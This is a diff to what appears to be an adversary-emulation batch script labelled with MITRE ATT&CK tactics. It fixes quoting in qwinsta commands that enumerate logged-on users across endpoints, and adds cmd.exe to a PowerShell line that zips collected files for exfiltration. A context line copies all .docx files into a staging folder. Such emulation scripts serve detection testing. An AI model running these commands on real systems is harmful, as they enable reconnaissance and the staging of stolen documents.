@@ -7,11 +7,11 @@
 
 :: Single Endpoint
 
-:: for /F “tokens=1,2” %i in (‘qwinsta /server:<COMPUTERNAME> ^| findstr “Active Disc”‘) do @echo %i | find /v “#” | find /v “console” || echo %j > usernames.txt
+:: for /F "tokens=1,2" %i in ('qwinsta /server:<COMPUTERNAME> ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
 
 :: Multiple Endpoints
 
-@FOR /F %n in (computers.txt) DO @FOR /F “tokens=1,2” %i in (‘qwinsta /server:%n ^| findstr “Active Disc”’) do @echo %i | find /v “#” | find /v “console” || echo %j > usernames.txt
+@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in (‘qwinsta /server:%n ^| findstr "Active Disc"’) do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
 
 
 :: Tactic: Credential Access, Lateral Movement
@@ -51,4 +51,4 @@ for /R c: %f in (*.docx) do copy %f c:\temp\
 :: Tactic: Exfiltration
 :: Technique: Data Compressed: https://attack.mitre.org/wiki/Technique/T1002
 
-powershell.exe dir c:\temp -Recurse | Compress-Archive -DestinationPath C:\temp\allthedataz.zip
+cmd.exe /c powershell.exe dir c:\temp -Recurse | Compress-Archive -DestinationPath C:\temp\allthedataz.zip
